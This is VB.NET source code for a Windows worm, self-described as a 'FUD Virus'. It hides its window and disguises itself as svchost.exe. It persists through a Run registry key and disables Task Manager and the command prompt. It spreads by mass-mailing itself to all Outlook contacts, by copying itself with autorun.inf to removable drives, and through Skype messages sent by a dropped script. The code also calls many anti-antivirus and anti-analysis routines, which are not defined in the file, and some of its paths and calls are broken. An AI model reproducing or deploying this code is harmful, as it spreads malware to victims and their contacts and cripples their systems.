Imports Microsoft.Win32
Imports System.IO

Public Class mainVirus
    ''''''''''''''''''''''''
    ' 11/15/2016 FUD Virus '
    'Coded by Bailey Dunlap'
    ''''''''''''''''''''''''
    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer

    Const SWP_HIDEWINDOW = &H80
    Const SWP_SHOWWINDOW = &H40

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Me.ShowInTaskbar = False

        'Skype Spread
        SkypeSpread()
                
        'Disable Right Mouse Click
        My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" & "\NoViewContextMenu", 1, "REG_DWORD")
        Dim systemRegistry As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")
        Dim regStartUp As RegistryKey = Registry.LocalMachine.OpenSubKey("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
        Dim value As String
        systemRegistry.SetValue("\NoViewContextMenu", 1, "REG_DWORD")
        systemRegistry.Close()

        Dim userRoot As String = System.Environment.GetEnvironmentVariable("USERPROFILE")
        Dim downloadFolder As String = Path.Combine(userRoot, "Downloads")
        Dim exeName As String = ":\svchost.exe"
        Dim currentExeName As String = "svchost.exe"

        If IO.Directory.Exists("C:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "A" + exeName, overwrite:=True)
        End If

        While (True)
            DriveCheck()
            AntiNotepad()
            AntiCMD()
            antiOutpost()
            antiNode32()
            antiZoneAlarm()
            AntiVmWare()
            antiKAV()
            AntiVirtualBox()
            AntiVirtualPC()
            antiAnubis()
            antiAnubis2()
            AntiWireShark()
            AntiWindowsDefender()
            AntiASquared()
            AntiAvast()
            AntiAVG()
            AntiBitDefender()
            AntiKaspersky()
            AntiMalwarebytes()
            AntiMcAfee()
            AntiNOD32()
            AntiNorton()
            AntiOllyDBG()
            AntiDDT()
            AntiAQTime()
            AntiAQtime2()
            AntiPROA()
            AntiWinDbg()
            AntiConEmu()
            AntiColorConsole()
            AntiPowerCmd()
            antiSandboxie()
            antiSandboxie2()
            AddToStartup()
            EmailSpreader()
            DisableTM_RE()
            DisableFireWall()
        End While
    End Sub

    Public Sub DisableTM_RE()
        Dim systemRegistry As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")
        systemRegistry.SetValue("DisableTaskMgr", 1)
        systemRegistry.Close()

        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)

    End Sub

    Public Sub DisableFireWall()
        Dim psi As New ProcessStartInfo("netsh", "firewall set opmode enable")
        psi.WindowStyle = ProcessWindowStyle.Hidden
        Process.Start(psi)
    End Sub

    Public Sub EmailSpreader()
        'Email Spreader
        Dim so As Object = CreateObject("fso")
        Dim ol As Object = CreateObject("Outlook.Application")
        Dim out As Object = CreateObject("Outlook.Application")
        Dim mapi As Object = out.GetNameSpace("MAPI")
        Dim a As Object = mapi.AddressLists(1)
        For X = 1 To a.AddressEntries.Count
            Dim Mail As Object = ol.CreateItem(0)
            Mail.to = ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(X)
            Mail.Subject = "Fwd:None"
            Mail.Body = ""
            Mail.Attachments.Add = "C:\svchost.exe"
            Mail.Send
        Next
        ol.Quit
    End Sub

    'USB Spreader
    'hackforums.net/showthread.php?tid=629614
    Sub USBInfect()
        On Error Resume Next
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", "0", Microsoft.Win32.RegistryValueKind.DWord)
        Dim sDrive As String, sDrives() As String, xDrive As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
        sDrives = System.IO.Directory.GetLogicalDrives
        For Each sDrive In sDrives
            If xDrive.Contains(sDrive) Then
            Else
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, sDrive & "svchost.exe", True, FileIO.UICancelOption.DoNothing)
                My.Computer.FileSystem.WriteAllText(sDrive & "autorun.inf", "[autorun]" & vbCrLf & "open=" & sDrive & "svchost.exe" & vbCrLf & "shellexecute=" & sDrive, True)
                SetAttr(sDrive & "svchost.exe", FileAttribute.Hidden)
                SetAttr(sDrive & "autorun.inf", FileAttribute.Hidden)
            End If
        Next
    End Sub

    Public Sub DriveCheck()
        'Infect Removable Drives & Hidden Drives
        'Does not auto-execute the file on run, it just moves the virus to the directory after scanning all drives until it detects the removable drives
        'Hence why I did not add:
        ''''''''''''''''''''''''''''''''''''''''''''''''''''
        '    If IO.Directory.Exists("C:\") Then
        '       FileIO.FileSystem.CopyFile(
        '           downloadFolder + currentExeName,
        '           "C" + exeName, overwrite:=True)
        '    End If
        ''''''''''''''''''''''''''''''''''''''''''''''''''''
        Dim userRoot As String = System.Environment.GetEnvironmentVariable("USERPROFILE")
        Dim downloadFolder As String = Path.Combine(userRoot, "Downloads")
        Dim exeName As String = ":\svchost.exe"
        Dim currentExeName As String = "svchost.exe"

        If IO.Directory.Exists("A:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "A" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("B:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + "",
                "B" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("D:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "D" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("E:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "E:" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("F:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "F" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("G:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "G" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("H:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "H" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("I:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "I" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("J:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "J" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("K:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "K" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("L:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "L" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("M:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "M" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("N:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "N" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("O:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "O" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("P:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "P" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("Q:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "Q" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("R:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "R" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("S:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "S" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("T:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "T" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("U:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "U" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("V:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "V" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("W:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "W" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("X:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "X" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("Y:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "Y" + exeName, overwrite:=True)
        ElseIf IO.Directory.Exists("Z:\") Then
            FileIO.FileSystem.CopyFile(
                downloadFolder + currentExeName,
                "Z" + exeName, overwrite:=True)
        End If
    End Sub

    Public Sub AddToStartup()
        Dim regStartUp As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
        Dim value As String

        value = regStartUp.GetValue("svchost")

        If value <> Application.ExecutablePath.ToString() Then
            regStartUp.CreateSubKey("svchost")
            regStartUp.SetValue("svchost", Application.ExecutablePath.ToString())
        End If
    End Sub

Sub SkypeSpread()
        If "%SKYPE%" = "True" Then
            Try
                Dim g As New StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\cc.vbs")
                g.BaseStream.Seek(0, SeekOrigin.End)
                g.WriteLine("on error resume next")
                g.WriteLine("set Fruxr = WScript.CreateObject(""Skype4COM.Skype"", ""Skype_"")")
                g.WriteLine("Fruxr.Client.Start()")
                g.WriteLine("Fruxr.Attach()")
                g.WriteLine("For Each KZN In Fruxr.Friends")
                g.WriteLine("Fruxr.SendMessage KZN.handle,""%IMMESSAGE%""")
                g.WriteLine("next")
                g.Close()
                Dim p As New Process
                Dim ProcessProperties As New ProcessStartInfo
                ProcessProperties.FileName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\cc.vbs"
                Dim myProcess As Process = Process.Start(ProcessProperties)
                myProcess.WaitForExit()
                Threading.Thread.Sleep(5000)
                IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\cc.vbs")
            Catch ex As Exception
                MsgBox(ex.ToString)
            End Try
        End If
    End Sub

End Class
